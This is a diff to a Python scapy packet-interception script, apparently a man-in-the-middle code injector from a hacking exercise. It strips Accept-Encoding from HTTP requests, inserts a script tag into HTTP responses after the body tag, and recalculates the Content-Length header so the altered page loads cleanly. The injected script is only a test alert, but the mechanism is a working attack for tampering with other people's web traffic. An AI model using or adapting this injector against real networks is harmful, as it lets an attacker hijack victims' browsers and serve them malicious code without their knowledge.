@@ -21,14 +21,17 @@ def process_packet(pkt):
             print("[+] HTTP Request")
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load.decode('utf-8', errors='ignore'))
             # to search the content length value in request:
-            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
-            # (?:....) to locate the regrex keywords
-            if content_length_search:
-                content_length = content_length_search.group(1)
-                print(content_length)
+
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] HTTP Response")
-            load = bytes(load.replace(b"<body>", b"<script>alert('test')</script><body>"))
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load.decode('utf-8', errors='ignore'))
+            # (?:....) to locate the regrex keywords
+            injection_code = b"<script>alert('test')</script>"
+            load = bytes(load.replace(b"<body>", b"<body>" + injection_code))
+            if content_length_search:
+                content_length = content_length_search.group(1)
+                new_content_length = str(int(content_length) + len(injection_code))
+                load = load.replace(bytes(content_length, 'utf-8'), new_content_length.encode('utf-8'))
 
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
